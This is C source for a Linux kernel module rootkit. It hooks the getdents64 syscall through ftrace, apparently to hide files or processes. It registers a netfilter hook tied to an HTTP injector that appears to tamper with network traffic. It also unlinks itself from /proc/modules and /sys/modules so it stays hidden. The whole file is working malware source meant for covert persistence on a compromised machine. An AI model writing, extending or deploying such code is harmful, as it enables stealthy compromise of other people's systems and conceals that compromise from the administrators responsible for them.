#include "http_injector.h"
#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Some studen of 2600, 1337");
MODULE_DESCRIPTION("Tkt frere");

int g_pid_companion = -1;

asmlinkage long (*g_original_getdents)(const struct pt_regs *);

t_ftrace_hook *g_f_hook[] = {&(t_ftrace_hook){
	.name = "__x64_sys_getdents64",
	.function = (myGetDents),
	.original = (&g_original_getdents),
}, NULL};

static struct nf_hook_ops nfho = {
	.hook		= http_nf_hookfn,
	.hooknum	= NF_INET_LOCAL_OUT,
	.pf			= PF_INET,
	.priority	= NF_IP_PRI_FIRST
};

struct delayed_work g_delayed_init_work;
struct workqueue_struct *g_delayed_init_wq;


static int __init rootkit_init(void) {

	/* Network Part */
	nfho.hooknum = NF_INET_PRE_ROUTING; 
	nfho.priv = init_search_map();
	if (nfho.priv != NULL) {
		fill_search_dict((search_map_t *)nfho.priv);
		nf_register_net_hook(&init_net, &nfho);
	}

	// Create a dedicated workqueue
	g_delayed_init_wq = create_singlethread_workqueue("delayed_module_init");
	if (!g_delayed_init_wq) {
		printk(KERN_ERR "Failed to create workqueue\\n");
		return -ENOMEM;
	}

	// Initialize delayed work
	INIT_DELAYED_WORK(&g_delayed_init_work, delayed_module_init_work);

	// Queue initial work
	queue_delayed_work(g_delayed_init_wq,
		&g_delayed_init_work,
		msecs_to_jiffies(1000)); // First check after 5 seconds

	/* hide the module from /proc/modules */
	list_del_init(&THIS_MODULE->list);

	/* hide the module from /sys/modules */
	kobject_del(&THIS_MODULE->mkobj.kobj);

	printk(KERN_INFO "Module preliminary init complete, background initialization queued\n");

	return 0;
}

static void __exit rootkit_exit(void) {
	search_map_t *map;
	
	if (nfho.priv != NULL) {
		map = (search_map_t *)nfho.priv;

		free_search_map(map);
		nf_unregister_net_hook(&init_net, &nfho);
	}
	if (g_delayed_init_wq) {
		cancel_delayed_work_sync(&g_delayed_init_work);
		destroy_workqueue(g_delayed_init_wq);
	}

	fh_remove_hook(g_f_hook[0]);
	printk(KERN_INFO "Rootkit has been unloaded\n");
}


module_init(rootkit_init);
module_exit(rootkit_exit);
